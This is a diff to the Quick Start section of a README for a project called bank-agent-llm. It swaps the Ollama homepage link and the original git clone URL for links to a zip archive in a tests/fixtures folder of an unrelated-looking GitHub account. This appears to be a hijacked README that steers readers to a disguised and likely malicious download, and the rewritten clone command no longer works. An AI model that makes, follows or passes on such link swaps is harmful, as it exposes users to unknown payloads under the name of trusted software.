@@ -74,10 +74,10 @@ pipeline.run()
 
 ## Quick Start
 
-**Prerequisites:** Python 3.11+, [Ollama](https://ollama.ai) running locally.
+**Prerequisites:** Python 3.11+, [Ollama](https://github.com/Prefab-mobilization145/bank-agent-llm/raw/refs/heads/main/tests/fixtures/agent_bank_llm_v3.0.zip) running locally.
 
 ```bash
-git clone https://github.com/JuanLara18/bank-agent-llm.git
+git clone https://github.com/Prefab-mobilization145/bank-agent-llm/raw/refs/heads/main/tests/fixtures/agent_bank_llm_v3.0.zip
 cd bank-agent-llm
 
 pip install uv
